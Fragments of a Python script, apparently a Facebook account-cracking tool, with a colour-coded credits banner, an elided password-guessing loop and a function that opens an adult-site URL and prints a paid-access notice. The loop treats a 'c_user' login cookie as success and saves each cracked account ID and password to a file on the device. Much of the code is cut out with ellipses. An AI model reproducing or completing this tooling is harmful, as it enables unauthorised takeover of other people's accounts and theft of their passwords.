...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mMADE BY     : M4HIN-HASAN
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB          : Mahin Hasn
...
def nunu():
	...
	os.system("clear")
	os.system("xdg-open https://xgx.mobi/free/free-sex-vedeo/ ")
	print(logo)
	print(f" {ORANGE}7 DAYS USE FOR 1000000৳ TAKA🥵")
	sys.exit()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/SAMI-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write('\r %s[ MAHIN-BOSS] [%s/%s]  CP:- %s  OK:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
